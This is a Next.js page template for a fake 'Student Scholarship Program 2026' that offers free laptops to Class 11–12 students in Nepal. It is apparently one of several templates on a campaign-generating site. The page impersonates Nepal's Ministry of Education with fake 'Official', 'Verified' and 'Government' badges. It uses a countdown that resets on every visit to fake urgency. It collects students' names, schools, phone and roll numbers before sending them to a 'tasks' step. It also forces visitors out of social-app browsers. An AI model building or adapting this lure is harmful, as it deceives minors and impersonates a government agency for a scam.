// pages/templates/student-scholarship-nepal-v1.js
import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { withCampaignMeta } from '../../lib/withCampaignMeta';
import { fetchCampaign } from '../../lib/fetchCampaign';
import {
  FaBook,
  FaGraduationCap,
  FaClock,
  FaLaptop,
  FaBullseye,
  FaLock,
  FaCheckCircle,
  FaUniversity,
  FaBookOpen,
  FaClipboardList,
  FaGlobe,
  FaCopy,
  FaExternalLinkAlt,
  FaArrowRight,
  FaSpinner,
  FaShieldAlt,
  FaGift,
  FaMedal,
  FaUser,
  FaPhone,
  FaHashtag,
  FaSchool,
} from 'react-icons/fa';

// ── Default Meta (Clean URL) ──
const defaultMeta = {
  title: 'Government Scholarship 2026 – Laptop for Students',
  description:
    'Apply for the Government Student Scholarship Program 2026. Class 11 & 12 students can get a laptop for digital learning. Limited time offer – 24 hours only.',
  image: 'https://i.postimg.cc/9fqWws3p/1784692216079.png',
  url: 'https://maketrend.vercel.app/student-scholarship-nepal-v1', // ✅ Clean base URL
};

function StudentScholarshipNepalV1({ campaign }) {
  const router = useRouter();
  const { id } = router.query;

  const [formData, setFormData] = useState({
    name: '',
    college: '',
    class: '',
    phone: '',
    rollNumber: '',
  });
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [timeRemaining, setTimeRemaining] = useState({
    hours: 24,
    minutes: 0,
    seconds: 0,
  });
  const [showWebViewModal, setShowWebViewModal] = useState(false);

  // ── ✅ CLEAN URL: remove query params if no id ──
  useEffect(() => {
    if (!router.isReady) return;
    if (!id && router.asPath.includes('?')) {
      router.replace(router.pathname, undefined, { shallow: true });
    }
  }, [router.isReady, id, router]);

  // ── Detect WebView ──
  useEffect(() => {
    const ua = navigator.userAgent.toLowerCase();
    const isWebView = /facebook|instagram|twitter|tiktok|line|whatsapp|snapchat|pinterest|fbav|fban/.test(ua) ||
                      (window.navigator.standalone === false) ||
                      (typeof window.ReactNativeWebView !== 'undefined') ||
                      (navigator.userAgent.indexOf('wv') > -1);
    if (isWebView) setShowWebViewModal(true);
  }, []);

  // ── 24‑hour countdown timer ──
  useEffect(() => {
    const startTime = Date.now();
    const duration = 24 * 60 * 60 * 1000;

    const timer = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const remaining = Math.max(0, duration - elapsed);

      const hours = Math.floor(remaining / (1000 * 60 * 60));
      const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((remaining % (1000 * 60)) / 1000);

      setTimeRemaining({ hours, minutes, seconds });

      if (remaining === 0) {
        clearInterval(timer);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // ── Handle form input changes ──
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (error) setError('');
  };

  // ── Validate and submit ──
  const handleContinue = () => {
    const { name, college, class: studentClass } = formData;

    if (!name.trim()) {
      setError('Please enter your full name.');
      return;
    }
    if (!college.trim()) {
      setError('Please enter your college name.');
      return;
    }
    if (!studentClass) {
      setError('Please select your class.');
      return;
    }

    setIsLoading(true);

    if (!id) {
      router.push('/create');
      return;
    }

    router.push(`/tasks?id=${id}`);
  };

  // ─── WEBVIEW MODAL ───
  const WebViewModal = () => {
    if (!showWebViewModal) return null;
    return (
      <div className="modal-overlay">
        <div className="modal-card">
          <FaGlobe className="modal-icon" style={{ fontSize: '3.2rem', marginBottom: '0.5rem', color: '#ff8c00' }} />
          <h2>Open in Browser</h2>
          <p>For the best experience, open this page in your default browser.</p>
          <div className="modal-actions">
            <button
              className="modal-btn"
              onClick={() => {
                navigator.clipboard?.writeText(window.location.href);
                setShowWebViewModal(false);
              }}
            >
              <FaCopy className="icon-inline" /> Copy Link
            </button>
            <button
              className="modal-btn primary"
              onClick={() => {
                const url = window.location.href;
                if (navigator.userAgent.includes('Android')) {
                  window.location.href = `intent://${window.location.host}${window.location.pathname}${window.location.search}${window.location.hash}#Intent;scheme=https;package=com.android.chrome;end`;
                } else {
                  window.open(url, '_system');
                }
              }}
            >
              <FaExternalLinkAlt className="icon-inline" /> Open in Browser
            </button>
          </div>
          <button
            className="modal-btn ghost"
            onClick={() => setShowWebViewModal(false)}
          >
            Continue Anyway
          </button>
        </div>
      </div>
    );
  };

  // ── Main UI ──
  return (
    <div className="page-wrapper">
      {/* ─── WEBVIEW MODAL ─── */}
      <WebViewModal />

      <header className="site-header">
        <div className="header-logo">
          <span className="logo-text"><FaBook className="icon-inline" /> <strong>Scholarship</strong> 2026</span>
        </div>
        <div className="header-badge">
          <span className="pulse-dot"></span> Official Program
        </div>
      </header>

      <section className="hero-section">
        <div className="hero-content">
          <div className="hero-icon"><FaGraduationCap style={{ fontSize: '2.5rem' }} /></div>
          <h1>Student Scholarship Program 2026</h1>
          <p>Government initiative to support Class 11 &amp; 12 students with laptops for digital learning.</p>
          <div className="hero-badge-row">
            <span><FaClock className="icon-inline" /> 24 Hours</span>
            <span><FaBook className="icon-inline" /> Class 11–12</span>
            <span><FaLaptop className="icon-inline" /> Laptop</span>
          </div>
        </div>
      </section>

      <main className="main-card-wrapper">
        <div className="reward-card">
          <div className="timer-section">
            <div className="timer-display">
              <div className="timer-block">
                <span className="timer-value">{String(timeRemaining.hours).padStart(2, '0')}</span>
                <span className="timer-label">Hours</span>
              </div>
              <span className="timer-separator">:</span>
              <div className="timer-block">
                <span className="timer-value">{String(timeRemaining.minutes).padStart(2, '0')}</span>
                <span className="timer-label">Minutes</span>
              </div>
              <span className="timer-separator">:</span>
              <div className="timer-block">
                <span className="timer-value">{String(timeRemaining.seconds).padStart(2, '0')}</span>
                <span className="timer-label">Seconds</span>
              </div>
            </div>
            <p className="timer-subtext"><FaClock className="icon-inline" /> Time remaining to apply</p>
          </div>

          <div className="step-indicator">
            <div className="step-dot active">1</div>
            <div className="step-dot">2</div>
          </div>

          <div className="panel">
            <div className="text-center">
              <span className="reward-tag"><FaBullseye className="icon-inline" /> Apply Now</span>
              <h2 className="form-title">Student Details</h2>
              <p className="benefit-text">
                Fill in your details to apply for the <strong>laptop scholarship</strong>. This is a limited‑time opportunity.
              </p>
            </div>

            <div className="input-group">
              <label className="input-label"><FaUser className="icon-inline" /> Full Name <span className="required">*</span></label>
              <input
                type="text"
                name="name"
                placeholder="e.g., Ram Sharma"
                value={formData.name}
                onChange={handleInputChange}
                className={`form-input ${error && !formData.name ? 'error' : ''}`}
              />
            </div>

            <div className="input-group">
              <label className="input-label"><FaSchool className="icon-inline" /> College / School <span className="required">*</span></label>
              <input
                type="text"
                name="college"
                placeholder="e.g., Janata Secondary School"
                value={formData.college}
                onChange={handleInputChange}
                className={`form-input ${error && !formData.college ? 'error' : ''}`}
              />
            </div>

            <div className="input-group">
              <label className="input-label"><FaBook className="icon-inline" /> Class <span className="required">*</span></label>
              <select
                name="class"
                value={formData.class}
                onChange={handleInputChange}
                className={`form-select ${error && !formData.class ? 'error' : ''}`}
              >
                <option value="">Select your class</option>
                <option value="11">Class 11</option>
                <option value="12">Class 12</option>
              </select>
            </div>

            <div className="input-group">
              <label className="input-label"><FaPhone className="icon-inline" /> Phone Number <span className="optional">(optional)</span></label>
              <input
                type="tel"
                name="phone"
                placeholder="e.g., 98XXXXXXXX"
                value={formData.phone}
                onChange={handleInputChange}
                className="form-input"
              />
            </div>

            <div className="input-group">
              <label className="input-label"><FaHashtag className="icon-inline" /> Symbol / Roll No. <span className="optional">(optional)</span></label>
              <input
                type="text"
                name="rollNumber"
                placeholder="e.g., 12345"
                value={formData.rollNumber}
                onChange={handleInputChange}
                className="form-input"
              />
            </div>

            {error && <p className="error-msg">{error}</p>}

            <button
              className="btn-primary"
              onClick={handleContinue}
              disabled={isLoading}
            >
              {isLoading ? (
                <>
                  <FaSpinner className="spinner" /> Processing...
                </>
              ) : (
                <>
                  Continue to Claim <FaGraduationCap className="icon-inline" />
                </>
              )}
            </button>

            <div className="trust-badges">
              <span><FaLock className="icon-inline" /> Secure</span>
              <span><FaCheckCircle className="icon-inline" /> Verified</span>
              <span><FaUniversity className="icon-inline" /> Government</span>
            </div>
          </div>
        </div>
      </main>

      <div className="trust-cards">
        <div><FaLaptop className="icon-inline" /><span>Laptop</span></div>
        <div><FaBook className="icon-inline" /><span>Class 11–12</span></div>
        <div><FaUniversity className="icon-inline" /><span>Government</span></div>
        <div><FaClock className="icon-inline" /><span>24 Hours</span></div>
      </div>

      <div className="info-sections">
        <div className="info-block">
          <h3><FaBookOpen className="icon-inline" /> About the Program</h3>
          <p>
            The <strong>Student Scholarship Program 2026</strong> is a government initiative to provide <strong>laptops</strong> to Class 11 and 12 students across Nepal. The goal is to bridge the digital divide and enable students to access online learning resources effectively.
          </p>
        </div>
        <div className="info-block">
          <h3><FaClipboardList className="icon-inline" /> Eligibility &amp; Terms</h3>
          <ul>
            <li><strong>Open to:</strong> All students currently enrolled in Class 11 or 12.</li>
            <li><strong>Institution:</strong> Must be studying in a recognized school/college in Nepal.</li>
            <li><strong>One application</strong> per student – duplicate entries will be disqualified.</li>
            <li>Selected students will be notified via SMS/email.</li>
            <li>This is a <strong>limited‑time offer</strong> – apply within 24 hours.</li>
          </ul>
        </div>
      </div>

      <footer className="site-footer">
        <p>© 2026 Ministry of Education, Nepal. All Rights Reserved.</p>
        <p className="footer-contact">Kathmandu, Nepal &nbsp;|&nbsp; Support: 1660</p>
      </footer>

      {/* ── ENHANCED STYLES ── */}
      <style dangerouslySetInnerHTML={{ __html: `
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Plus Jakarta Sans', system-ui, sans-serif; background: #f0f7ff; color: #1f2937; line-height: 1.6; min-height: 100vh; }
        .page-wrapper { max-width: 100%; overflow-x: hidden; }
        .icon-inline { display: inline-block; margin-right: 4px; vertical-align: middle; }

        .site-header {
          position: sticky; top: 0; z-index: 100;
          background: rgba(255,255,255,0.92);
          backdrop-filter: blur(12px);
          border-bottom: 1px solid rgba(0, 86, 179, 0.08);
          padding: 0.7rem 1.5rem;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .header-logo .logo-text { font-size: 1.1rem; font-weight: 800; color: #0a2463; letter-spacing: -0.5px; }
        .header-logo .logo-text strong { color: #0066cc; }
        .header-badge {
          display: flex;
          align-items: center;
          gap: 8px;
          font-size: 0.65rem;
          font-weight: 800;
          text-transform: uppercase;
          letter-spacing: 0.8px;
          color: #0066cc;
          background: #e6f0ff;
          padding: 6px 14px;
          border-radius: 99px;
          border: 1px solid rgba(0, 86, 179, 0.15);
        }
        .pulse-dot { width: 8px; height: 8px; background: #0066cc; border-radius: 50%; animation: pulseDot 2s infinite; }
        @keyframes pulseDot { 0%,100% { box-shadow: 0 0 0 0 rgba(0,102,204,0.5); } 50% { box-shadow: 0 0 0 10px rgba(0,102,204,0); } }

        .hero-section {
          position: relative;
          width: 100%;
          min-height: 240px;
          background: linear-gradient(155deg, rgba(10, 36, 99, 0.88), rgba(0, 86, 179, 0.85), rgba(0, 153, 204, 0.75)),
            url('https://images.unsplash.com/photo-1523050854058-8df90110c7f1?q=80&w=1200&auto=format&fit=crop') center/cover no-repeat;
          display: flex;
          align-items: center;
          justify-content: center;
          text-align: center;
          color: white;
          padding: 3rem 1.5rem;
        }
        .hero-icon { font-size: 2.5rem; margin-bottom: 0.5rem; }
        .hero-content h1 { font-size: clamp(1.3rem, 3vw, 2rem); font-weight: 900; letter-spacing: -0.5px; margin-bottom: 0.4rem; }
        .hero-content p { font-size: 0.9rem; opacity: 0.9; font-weight: 500; max-width: 420px; margin: 0 auto; }
        .hero-badge-row { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-top: 1rem; }
        .hero-badge-row span {
          background: rgba(255,255,255,0.15);
          backdrop-filter: blur(6px);
          border: 1px solid rgba(255,255,255,0.25);
          padding: 6px 14px;
          border-radius: 99px;
          font-size: 0.7rem;
          font-weight: 700;
          text-transform: uppercase;
          transition: all 0.3s ease;
        }
        .hero-badge-row span:hover {
          background: rgba(255,255,255,0.25);
          transform: translateY(-2px);
        }

        .timer-section {
          background: linear-gradient(135deg, #f0f7ff, #e6f0ff);
          border-radius: 20px;
          padding: 1.2rem 1rem;
          margin-bottom: 1.5rem;
          border: 1px solid rgba(0, 86, 179, 0.08);
          transition: box-shadow 0.3s ease;
        }
        .timer-section:hover { box-shadow: 0 4px 16px rgba(0,86,179,0.08); }
        .timer-display { display: flex; justify-content: center; align-items: center; gap: 4px; }
        .timer-block { text-align: center; min-width: 50px; }
        .timer-value {
          display: block;
          font-size: 2rem;
          font-weight: 900;
          color: #0a2463;
          letter-spacing: 1px;
          line-height: 1.2;
        }
        .timer-label {
          display: block;
          font-size: 0.55rem;
          font-weight: 700;
          text-transform: uppercase;
          color: #5a7a9a;
          letter-spacing: 0.5px;
        }
        .timer-separator {
          font-size: 2rem;
          font-weight: 900;
          color: #0a2463;
          padding: 0 2px;
        }
        .timer-subtext {
          text-align: center;
          font-size: 0.7rem;
          color: #5a7a9a;
          margin-top: 6px;
          font-weight: 600;
        }

        .main-card-wrapper { max-width: 480px; margin: -45px auto 2rem; padding: 0 1rem; position: relative; z-index: 10; }
        .reward-card {
          background: #ffffff;
          border-radius: 36px;
          padding: 2rem 1.6rem;
          box-shadow: 0 24px 56px rgba(0,0,0,0.10), 0 12px 32px rgba(0, 86, 179, 0.12);
          border: 1px solid rgba(0, 86, 179, 0.06);
          transition: box-shadow 0.3s ease;
        }
        .reward-card:hover { box-shadow: 0 32px 72px rgba(0,0,0,0.12), 0 16px 40px rgba(0,86,179,0.15); }

        .step-indicator { display: flex; justify-content: center; gap: 12px; margin-bottom: 1.8rem; }
        .step-dot {
          width: 34px; height: 34px; border-radius: 50%;
          background: white;
          border: 2.5px solid #d1d5db;
          display: flex;
          align-items: center; justify-content: center;
          font-size: 0.75rem; font-weight: 800;
          color: #9ca3af;
          transition: all 0.3s ease;
        }
        .step-dot.active {
          border-color: #0066cc;
          color: #0066cc;
          background: #e6f0ff;
          box-shadow: 0 0 0 6px rgba(0, 86, 179, 0.08);
        }
        .step-dot.completed {
          background: #0066cc;
          border-color: #0066cc;
          color: white;
        }

        .panel { animation: fadeSlide 0.4s ease-out forwards; }
        @keyframes fadeSlide { from { opacity:0; transform: translateY(16px); } to { opacity:1; transform: translateY(0); } }
        .text-center { text-align: center; }

        .reward-tag {
          display: inline-block;
          background: #e6f0ff;
          color: #0066cc;
          font-weight: 800;
          font-size: 0.7rem;
          text-transform: uppercase;
          letter-spacing: 1.5px;
          padding: 6px 16px;
          border-radius: 99px;
          margin-bottom: 0.5rem;
          border: 1px solid rgba(0, 86, 179, 0.15);
        }
        .form-title { font-size: 1.5rem; font-weight: 900; color: #0a2463; margin-bottom: 0.2rem; }
        .benefit-text { font-size: 0.85rem; color: #6b7280; margin-bottom: 1.5rem; font-weight: 500; }
        .input-group { margin-bottom: 1rem; }
        .input-label {
          display: block;
          font-size: 0.8rem;
          font-weight: 700;
          color: #374151;
          margin-bottom: 5px;
        }
        .input-label .required { color: #ef4444; margin-left: 2px; }
        .input-label .optional { color: #9ca3af; font-weight: 400; font-size: 0.7rem; margin-left: 4px; }
        .form-input, .form-select {
          width: 100%;
          padding: 0.9rem 1rem;
          border: 2.5px solid #e5e7eb;
          border-radius: 16px;
          font-size: 0.95rem;
          font-weight: 500;
          color: #111827;
          background: #f9fafb;
          transition: all 0.3s ease;
          font-family: inherit;
          appearance: none;
          -webkit-appearance: none;
        }
        .form-input:focus, .form-select:focus {
          border-color: #0066cc;
          background: white;
          outline: none;
          box-shadow: 0 0 0 6px rgba(0, 86, 179, 0.06);
        }
        .form-input.error, .form-select.error {
          border-color: #ef4444 !important;
          box-shadow: 0 0 0 6px rgba(239,68,68,0.06) !important;
        }
        .form-select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236b7280' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 1rem center; padding-right: 2.8rem; }
        .error-msg { display: block; font-size: 0.75rem; color: #ef4444; margin-top: 6px; font-weight: 600; padding-left: 4px; }

        .btn-primary {
          width: 100%;
          background: linear-gradient(135deg, #0a2463 0%, #0066cc 100%);
          color: white;
          border: none;
          padding: 1.1rem;
          border-radius: 20px;
          font-size: 1.05rem;
          font-weight: 800;
          cursor: pointer;
          transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
          box-shadow: 0 12px 32px rgba(0, 86, 179, 0.18);
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          letter-spacing: 0.3px;
          font-family: inherit;
          margin-top: 0.5rem;
        }
        .btn-primary:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 18px 40px rgba(0, 86, 179, 0.35); }
        .btn-primary:active:not(:disabled) { transform: scale(0.98); }
        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
        .btn-primary .spinner { animation: spin 0.8s linear infinite; display: inline-block; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .trust-badges {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 10px;
          margin-top: 1.8rem;
          padding-top: 1.4rem;
          border-top: 1px solid #f3f4f6;
        }
        .trust-badges span {
          text-align: center;
          font-size: 0.65rem;
          font-weight: 700;
          color: #6b7280;
          text-transform: uppercase;
          letter-spacing: 0.4px;
          transition: color 0.3s ease;
        }
        .trust-badges span:hover { color: #0a2463; }
        .trust-badges .icon { display: block; font-size: 1.3rem; margin-bottom: 4px; color: #0066cc; }

        .trust-cards {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
          gap: 12px;
          max-width: 700px;
          margin: 0 auto 2rem;
          padding: 0 1.5rem;
        }
        .trust-cards div {
          background: white;
          border-radius: 28px;
          padding: 1.2rem;
          text-align: center;
          border: 1px solid #f3f4f6;
          box-shadow: 0 1px 2px rgba(0,0,0,0.04);
          transition: all 0.3s ease;
          cursor: default;
        }
        .trust-cards div:hover {
          box-shadow: 0 8px 24px rgba(0,0,0,0.08);
          transform: translateY(-4px);
          border-color: #0066cc;
        }
        .trust-cards .icon { display: block; font-size: 1.8rem; margin-bottom: 6px; color: #0066cc; }
        .trust-cards span { font-size: 0.7rem; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 0.4px; }

        .info-sections { max-width: 700px; margin: 2rem auto 2rem; padding: 0 1.5rem; }
        .info-block {
          background: white;
          border-radius: 28px;
          padding: 1.8rem;
          margin-bottom: 1.5rem;
          border: 1px solid #f3f4f6;
          box-shadow: 0 2px 8px rgba(0,0,0,0.06);
          transition: all 0.3s ease;
        }
        .info-block:hover {
          box-shadow: 0 8px 24px rgba(0,0,0,0.08);
          border-color: rgba(0,86,179,0.2);
        }
        .info-block h3 {
          font-size: 1rem;
          font-weight: 800;
          color: #0a2463;
          margin-bottom: 0.6rem;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .info-block h3 .icon { font-size: 1.2rem; }
        .info-block p { font-size: 0.85rem; color: #6b7280; line-height: 1.7; }
        .info-block ul { list-style: none; padding: 0; }
        .info-block ul li {
          font-size: 0.83rem;
          color: #6b7280;
          padding: 6px 0 6px 22px;
          position: relative;
          line-height: 1.6;
          transition: color 0.3s ease;
        }
        .info-block ul li:hover { color: #1f2937; }
        .info-block ul li::before { content: '▸'; position: absolute; left: 0; color: #0066cc; font-weight: 700; }

        .site-footer {
          background: #f9fafb;
          border-top: 1px solid #e5e7eb;
          padding: 2rem 1.5rem;
          text-align: center;
        }
        .site-footer p { font-size: 0.7rem; color: #9ca3af; max-width: 550px; margin: 0 auto; line-height: 1.7; }
        .footer-contact { font-weight: 700; color: #6b7280; margin-top: 0.4rem; }

        /* ─── MODAL OVERLAY ─── */
        .modal-overlay {
          position: fixed;
          top: 0; left: 0; width: 100%; height: 100%;
          background: rgba(0,0,0,0.85);
          backdrop-filter: blur(16px);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
          animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        .modal-card {
          background: #1a1c22;
          border-radius: 36px;
          padding: 2.8rem 2rem;
          max-width: 420px;
          width: 90%;
          text-align: center;
          border: 1px solid rgba(255,140,0,0.2);
          box-shadow: 0 20px 50px rgba(0,0,0,0.6);
          animation: slideUp 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        @keyframes slideUp {
          from { opacity: 0; transform: translateY(20px) scale(0.95); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .modal-icon { font-size: 3.2rem; margin-bottom: 0.5rem; }
        .modal-card h2 {
          font-size: 1.6rem;
          font-weight: 800;
          color: #fff;
          margin-bottom: 0.5rem;
        }
        .modal-card p {
          color: #aaa;
          font-size: 0.95rem;
          margin-bottom: 1.8rem;
        }
        .modal-actions {
          display: flex;
          gap: 12px;
          flex-wrap: wrap;
          justify-content: center;
        }
        .modal-btn {
          background: rgba(255,255,255,0.08);
          border: 1px solid rgba(255,255,255,0.1);
          padding: 0.7rem 1.5rem;
          border-radius: 60px;
          font-weight: 600;
          color: #fff;
          cursor: pointer;
          transition: all 0.25s ease;
          flex: 1;
          min-width: 120px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 6px;
        }
        .modal-btn:hover {
          background: rgba(255,255,255,0.15);
          transform: translateY(-2px);
        }
        .modal-btn.primary {
          background: #ff8c00;
          border: none;
          color: #0b0d10;
        }
        .modal-btn.primary:hover {
          background: #e67600;
          box-shadow: 0 4px 16px rgba(255,140,0,0.3);
        }
        .modal-btn.ghost {
          background: transparent;
          border: none;
          color: #888;
          margin-top: 0.5rem;
          font-size: 0.8rem;
        }
        .modal-btn.ghost:hover { color: #fff; }

        @media (max-width: 520px) {
          .hero-section { min-height: 180px; padding: 1.8rem 1rem; }
          .hero-content h1 { font-size: 1.2rem; }
          .hero-content p { font-size: 0.75rem; }
          .hero-icon { font-size: 2rem; }
          .main-card-wrapper { margin-top: -35px; padding: 0 0.7rem; }
          .reward-card { padding: 1.5rem 1.1rem; border-radius: 28px; }
          .timer-value { font-size: 1.6rem; }
          .timer-block { min-width: 40px; }
          .form-title { font-size: 1.2rem; }
          .form-input, .form-select { padding: 0.75rem 0.9rem; font-size: 0.85rem; border-radius: 14px; }
          .btn-primary { padding: 0.95rem; font-size: 0.95rem; border-radius: 16px; }
          .trust-badges { gap: 6px; }
          .trust-badges span { font-size: 0.6rem; }
          .trust-badges .icon { font-size: 1.1rem; }
          .info-sections { padding: 0 0.8rem; }
          .info-block { padding: 1.2rem; border-radius: 20px; }
          .trust-cards { grid-template-columns: 1fr 1fr; gap: 10px; padding: 0 0.8rem; }
          .site-header { padding: 0.6rem 1rem; }
          .header-logo .logo-text { font-size: 0.95rem; }
          .header-badge { font-size: 0.55rem; padding: 5px 10px; gap: 4px; }
        }
        @media (max-width: 360px) {
          .timer-value { font-size: 1.3rem; }
          .timer-block { min-width: 32px; }
          .reward-card { padding: 1.2rem 0.9rem; }
        }
      `}} />
    </div>
  );
}

export async function getServerSideProps({ query }) {
  const campaignId = query.id || query.campaign || null;
  const campaign = campaignId ? await fetchCampaign(campaignId) : null;
  return { props: { campaign } };
}

export default withCampaignMeta(StudentScholarshipNepalV1, defaultMeta);